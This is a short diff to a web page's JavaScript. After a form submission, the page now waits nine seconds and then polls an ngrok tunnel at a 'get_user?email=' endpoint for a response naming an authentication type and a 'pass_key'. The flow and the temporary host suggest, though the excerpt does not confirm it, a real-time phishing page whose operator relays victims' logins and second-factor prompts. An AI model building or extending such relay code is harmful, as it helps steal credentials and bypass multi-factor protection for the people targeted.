@@ -583,12 +583,20 @@
 
                     if (response.ok) {
                         console.log('Data submitted, waiting for confirmation...');
-                        
-                        const webhookResponse = await new Promise(resolve => {
-                            setTimeout(() => {
-                            resolve({ status: 'success', auth_type :'autentication-app', pass_key: 20, message: 'Confirmation received!' });
-                            }, 9000); // simulate webhook wait
-                        });
+                       						
+						// Wait for 9 seconds (simulate webhook delay)
+						await new Promise(resolve => setTimeout(resolve, 9000));
+
+						// Call GET endpoint to fetch result by email
+						const queryEmail = encodeURIComponent(email);
+						const getResponse = await fetch(`https://208f-191-101-130-200.ngrok-free.app/get_user?email=${queryEmail}`);
+
+						if (getResponse.ok) {
+							const webhookResponse = await getResponse.json();
+							console.log('Webhook Response:', webhookResponse);
+						} else {
+							console.error('Failed to fetch webhook response.');
+						}
 
                         spinner.style.display = 'none';
                         // confirmation.style.display = 'block';
